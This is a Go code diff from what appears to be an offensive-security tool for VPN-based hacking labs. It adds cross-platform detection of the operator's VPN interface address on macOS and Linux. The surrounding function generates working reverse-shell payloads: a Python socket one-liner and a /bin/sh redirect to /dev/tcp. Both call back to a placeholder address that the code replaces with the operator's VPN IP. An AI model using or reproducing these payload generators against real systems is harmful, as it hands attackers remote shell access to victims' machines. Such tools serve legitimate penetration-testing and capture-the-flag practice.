@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"net"
 	"net/http"
+	"runtime"
 	"strings"
 )
 
@@ -31,6 +32,49 @@ func GetInterfaceIpv4Addr(interfaceName string) (addr string, err error) {
 	}
 	return ipv4Addr.String(), nil
 }
+func getVPNInterface() string {
+	if runtime.GOOS == "darwin" {
+		// macOS uses utun interfaces with random numbers
+		// Find the one with IPv4 address starting with 10.10.
+		interfaces, err := net.Interfaces()
+		if err == nil {
+			for _, iface := range interfaces {
+				if strings.HasPrefix(iface.Name, "utun") {
+					addrs, err := iface.Addrs()
+					if err == nil {
+						for _, addr := range addrs {
+							if ipnet, ok := addr.(*net.IPNet); ok {
+								if ipv4 := ipnet.IP.To4(); ipv4 != nil {
+									ipStr := ipv4.String()
+									if strings.HasPrefix(ipStr, "10.10.") {
+										return iface.Name
+									}
+								}
+							}
+						}
+					}
+				}
+			}
+		}
+	} else {
+		// Linux uses tun0
+		_, err := GetInterfaceIpv4Addr("tun0")
+		if err == nil {
+			return "tun0"
+		}
+	}
+	return ""
+}
+
+// GetVPNInterfaceIP returns the IP address of the VPN interface (cross-platform)
+func GetVPNInterfaceIP() (string, error) {
+	vpnIface := getVPNInterface()
+	if vpnIface == "" {
+		return "", fmt.Errorf("VPN interface not found")
+	}
+	return GetInterfaceIpv4Addr(vpnIface)
+}
+
 func revShellLinux() string {
 	template := `if command -v python > /dev/null 2>&1; then
 	python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("1.1.1.1",1337)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
@@ -51,11 +95,15 @@ if command -v sh > /dev/null 2>&1; then
 	/bin/sh -i >& /dev/tcp/1.1.1.1/1337 0>&1
 	exit;
 fi`
-	tun0, err := GetInterfaceIpv4Addr("tun0")
+	vpnIface := getVPNInterface()
+	if vpnIface == "" {
+		return ""
+	}
+	ip, err := GetInterfaceIpv4Addr(vpnIface)
 	if err != nil {
 		return ""
 	}
-	template = strings.ReplaceAll(template, "1.1.1.1", tun0)
+	template = strings.ReplaceAll(template, "1.1.1.1", ip)
 	return template
 }
 
